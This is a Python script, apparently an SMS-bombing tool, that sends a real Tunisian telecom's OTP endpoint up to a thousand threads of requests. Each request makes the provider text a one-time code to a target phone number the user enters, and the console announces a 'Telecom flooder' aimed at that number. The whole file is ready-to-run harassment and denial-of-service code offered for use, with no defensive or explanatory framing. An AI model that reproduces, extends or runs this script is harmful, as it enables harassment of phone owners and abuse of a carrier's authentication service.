import requests
import threading
import itertools
import time
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

init(autoreset=True)

request_count = 0
lock = Lock()
stop_event = threading.Event()

def send_otp(phone_number, max_requests):
    global request_count
    url = f"https://myttauth.tunisietelecom.tn/realms/selfcareportal/sms/otp-code?phoneNumber={phone_number}"
    while True:
        with lock:
            if request_count >= max_requests or stop_event.is_set():
                stop_event.set()
                break
            request_count += 1
        try:
            requests.get(url, timeout=5)
        except:
            pass  # ignore errors/timeouts

def worker(phone_number, max_requests):
    send_otp(phone_number, max_requests)

def show_counter(max_requests):
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    while not stop_event.is_set():
        with lock:
            count = request_count
        spin = next(spinner)
        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count} / {max_requests}", end='', flush=True)
        if count >= max_requests:
            break
        time.sleep(0.1)
    print(f"\n{Fore.YELLOW}Done! Sent {request_count} requests.")

def main_menu():
    while True:
        phone_number = input(Fore.CYAN + "Enter phone number (e.g. 97979797): ").strip()
        if not phone_number.isdigit() or len(phone_number) != 8:
            print(Fore.RED + "Invalid phone number. Must be 8 digits.")
            continue

        try:
            thread_count = int(input(Fore.CYAN + "How many threads? (10 to 1000): ").strip())
            if not 10 <= thread_count <= 1000:
                raise ValueError
        except ValueError:
            print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
            continue

        try:
            max_requests = int(input(Fore.CYAN + "How many SMS/requests to send?: ").strip())
            if max_requests <= 0:
                raise ValueError
        except ValueError:
            print(Fore.RED + "Invalid number of requests.")
            continue

        print(Fore.GREEN + f"\n🚀 Launching Telecom flooder with {thread_count} threads targeting {phone_number} to send {max_requests} requests...\n")

        global request_count
        request_count = 0
        stop_event.clear()

        threading.Thread(target=show_counter, args=(max_requests,), daemon=True).start()

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for _ in range(thread_count):
                executor.submit(worker, phone_number, max_requests)

        # Finished sending, ask for input to return or exit
        choice = input(Fore.YELLOW + "\nFinished sending requests. Press 1 to go back to the main menu, or any other key to exit: ").strip()
        if choice != "1":
            print(Fore.CYAN + "Exiting. Goodbye!")
            break
        else:
            print(Fore.GREEN + "Returning to main menu...\n")

if __name__ == "__main__":
    main_menu()
